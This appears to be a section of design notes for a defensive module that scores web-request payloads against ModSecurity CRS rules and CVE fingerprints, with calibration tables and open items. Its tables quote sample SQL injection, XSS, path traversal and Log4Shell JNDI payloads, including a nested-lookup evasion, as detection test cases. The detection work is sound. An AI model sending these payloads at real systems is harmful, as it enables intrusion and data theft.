string, because it is the *head of a chain* whose real detection lives in the
indented sub-rules that follow. B1's probe had reported "0 chained rules", which
was itself wrong: it tested `"chain" in actions.split(",")`, and continuation
folding leaves the token as `" chain"` with a leading space. 21 rules were
affected. They are now dropped and counted, per D3's standing preference for a
counted drop over a confident mistranslation, and a test asserts 932205 never
reappears in the rule set.

**Payloads are matched against both their raw and decoded forms.** In a live
ModSecurity the `ARGS` collection is already URL-decoded before rules see it;
163 of the extracted rules target `ARGS`, and 47 declare no transformation at
all, so those 47 would be blind to every encoded payload if only the raw text
were scanned. Each match records which form produced it, which is the provenance
Milestone C needs to judge whether the decoded pass earns its place.

**A denial-of-service bound was measured, not guessed.** `MAX_SCAN_LEN` began at
100 kB and a single long payload froze the test run. Match cost is roughly
quadratic in length — 1 kB in ~78 ms, 4 kB in ~514 ms, 20 kB in ~13 s — and
profiling put **88% of it in three rules** (932390, 941140, 932290) that
backtrack badly on long low-entropy input. Python's `re` has no per-match
timeout, so a length bound is the only mitigation short of a different engine.
The cap is now 2 kB, which keeps a 20-line batch near 3.6 s while covering real
payloads comfortably, and truncation is surfaced through `checks_skipped` rather
than being silent.

#### Following CRS's own PL1 default would break this module

The instinct on reading "paranoia levels" is to match only PL1, as a default CRS
deployment does. Measured, that is wrong here:

| Payload | All levels | PL1 only |
|---|---|---|
| `' OR '1'='1` | 36 | **0** |
| `id=1 UNION SELECT password FROM users--` | 26 | 10 |
| `<script>alert(1)</script>` | 31 | 15 |
| `../../../../etc/passwd` | 48 | 20 |
| `SELECT * FROM menu` (benign) | 0 | 0 |
| `50% off -- limited time` (benign) | 9 | 0 |

The most canonical SQLi payload there is scores **nothing** at PL1. A live CRS
sees the whole HTTP request and still has its chained rules; this module sees one
payload fragment and dropped the chains, so PL1 coverage is thinner here than it
is there. The headline score therefore counts every level, `anomaly_score_pl1` is
carried alongside for calibration context, and a test pins the finding so that
nobody "fixes" the module to respect the CRS default and silences it on the first
payload an analyst tries.

**Separation, as measured:** attacks 26-48, benign 0-9. That is the room a
Milestone C threshold has to work with, and a test asserts the gap rather than
asserting any particular number.

### Milestone C — CVE fingerprints and calibration

| # | Step | Depends on | Status |
|---|---|---|---|
| B3 | Category flags + `_WAF_EVIDENCE` map (D8) | B2 | **done** |
| C1 | `cve_fingerprints.json` — Log4Shell, Spring4Shell, ProxyShell (D10) | — | **done** |
| C2 | `fetch_cve_by_id()` in `cve_panel.py` + KEV cross-reference (D4) | C1 | **done** |
| C3 | Calibration corpus, then set the anomaly threshold and enable escalation | B3, C2 | **done** |

C3 is the point of the whole sequence. The corpus needs both halves, and the
second matters more:

- **True positives** — real payloads per category, encoded and plain.
- **True negatives** — the cases §5.4 exists for. Search queries containing
  `SELECT`, code-snippet URLs containing `<` and `>`, file-manager paths
  containing `../`, base64 in legitimate query parameters. **A false-positive
  rate on this half is the module's primary quality metric**, not its detection
  rate, and the threshold is chosen to satisfy it.

Both sibling modules found real defects at their calibration step
([`process_analyzer.md`](process_analyzer.md) §8). Budget for the same
here.

#### C3 calibration results (2026-08-11)

Corpus: 28 known-bad, 20 known-good, in
[`tests/fixtures/waf_corpus.json`](../tests/fixtures/waf_corpus.json).

| Measure | Result |
|---|---|
| Known-bad reaching Suspicious or Malicious | **28 / 28** |
| Known-good reaching **Malicious** | **0 / 20** |
| Known-good reaching Suspicious | 4 / 20 (20%) |
| Curated CVE payloads tripping their fingerprint | 7 / 8 |

**The corpus found three real defects before it found a threshold.** That is
what it was for.

**1. §4 rule 2 was letting CRS corroborate itself.** The briefing escalates a
lexical match to `Malicious` when "the anomaly score also crosses a threshold" —
written when libinjection (Layer 2) and CRS (Layer 3) were separate engines. D1
merged them, so the condition quietly became *CRS agreeing with CRS*: one layer
voting twice. Implemented literally it called an ordinary JSON body `Malicious`
at a score of 45, along with a shared code snippet and a CSV parameter list.

The fix is to require corroboration from a layer that is not CRS — Layer 1 saw
the payload arrive encoded, or Layer 4 recognised a CVE. This is a **deviation
from briefing §5.2**, forced by D1, and it is the single change that took the
false-`Malicious` rate from 15% to zero.

**2. Decisions must use the PL1+PL2 score, not the full one.** CRS's PL3 and PL4
rules are largely punctuation counters — "more than N special characters in this
argument". Measured, they put benign text *above* several real attacks:

| Payload | Full score | PL1+PL2 |
|---|---|---|
| `{"title":"Q3 report","tags":[…]}` (benign) | 45 | 18 |
| `if (a < b && c > d) { return 1; }` (benign) | 32 | 20 |
| `50% off -- limited time` (benign) | 9 | **0** |
| `1 AND SLEEP(5)` (attack) | 28 | 20 |
| `${jndi:ldap://…}` (attack) | 26 | 20 |

No threshold placed on the full score can separate those halves. On PL1+PL2,
four benign lines fall to exactly zero. A test pins the fact that the full score
*fails* to separate, so nobody simplifies back to it.

**3. The validation gate was refusing five corpus attacks**, including
Spring4Shell — a curated CVE fingerprint, the one layer allowed to return
`Malicious` unaided, being thrown away before Layer 4 ever ran. See D5, where
the marker list is now twice its briefing size and the reasoning is recorded.

**The threshold is 5.0 on the PL1+PL2 score** — one CRS rule at its own CRITICAL
weight, the smallest signal that is not punctuation noise.

**The 20% Suspicious false-positive rate is real and was not optimised away.**
The four lines are a code snippet, a JSON body, a CSV parameter list and
`../shared/reports` in a file manager. A live WAF at PL2 flags all four, which
is why they are in the corpus. Raising the threshold to 20 would clear three of
them and simultaneously drop `rce_backtick`, `xss_svg_onload` and
`lfi_php_wrapper` to `Unknown`. That trade was measured and **rejected**: this
module never returns `Benign`, so `Suspicious` and `Unknown` both mean "a human
decides" and the only difference is whether the line draws attention — while a
missed attack is simply missed. The hard requirement, asserted separately, is
that the false-`Malicious` rate stays at zero.

**One documented fingerprint gap.** `${${lower:j}ndi:${lower:l}dap://…}` — the
nested-lookup Log4Shell evasion — does not trip its fingerprint, because Layer 1
does not resolve Log4j lookups and the literal `jndi:` never appears. Writing a
fuzzy pattern for it is exactly what the admission bar forbids, so it is left to
CRS, which catches it at `Suspicious`. The corpus entry carries
`expect_fingerprint: false` and a note; a separate test asserts that documented
gaps still reach `Suspicious`, so a limitation cannot silently become a hole.

---

## 7. Open Items Carried Forward

- **CRS extraction yield is unmeasured (D3, B1).** The fraction of target rules
  surviving `@detectSQLi` / `@pmFromFile` / PCRE-incompatibility drops is unknown
  until the extractor runs. If it is low, D1's "CRS covers SQLi and XSS instead"
  is weaker than stated and the libinjection question genuinely reopens — on
  objection #2 only.
- **Regex SQLi detection is more evadable than token-based detection (D1).** An
  accepted, deliberate capability loss. Layer 1 normalisation mitigates the
  encoding-based evasions; comment-insertion and case-mixing tricks are mitigated
  only to the extent CRS's own authors handled them.
- **The anomaly threshold is deferred by design (§4, C3).** Shipping B with the
  score visible but inert is the mitigation, not an oversight.
- **The payload-only fallback is not built (D5).** Briefing §2.1 step 4 remains
  unimplemented; revisit against real usage, and only with a rule that does not
  put ordinary URLs at risk of reclassification.
- **Unparsed lines still vanish silently (D6).** Briefing §5.6's manual-review
  routing needs a `parse_iocs` contract change affecting every caller. Worth
  doing as its own piece of work — it would benefit every IOC type, not just
  this one.
- **The CVE fingerprint dictionary is the load-bearing assumption behind the only
  single-source `Malicious` in the module (D10).** Every entry added weakens or
  strengthens that exception. Growth should be evidence-driven per briefing §10,
  and any entry that could plausibly match legitimate traffic invalidates the
  exception rather than merely adding noise.
- **`decode_common.py` now has two consumers with different calibrations (D2).**
  A future change made for one module can silently degrade the other. The cmdline
  calibration suite is the guard; keep it in the same CI path as this module's.
- **The UTF-16LE fallback rescues low-byte binary into plausible text (found in
  A1).** An even-length run of low bytes is invalid as UTF-8 — control characters
  fail the printable-ratio check — but reinterpreted as UTF-16LE it yields exotic
  yet `str.isprintable()` code points, so `b64_decode_text` returns a "decode"
  for what is actually binary. The command-line module is shielded downstream by
  `b64_require_command_shape=True`; **a WAF payload cannot use that gate** (D2),
  so this module is exposed where its sibling is not. Pinned as known behaviour
  in `test_decode_common.py::test_known_gap_utf16_fallback_rescues_low_byte_binary`
  and deliberately not fixed in A1, which was constrained to preserve the
  shipped module's calibration exactly. Options for Milestone B, in preference
  order: raise the printable-ratio bar for the no-shape case, or require the
  decode to contain at least one ASCII character. Needs the corpus to choose.
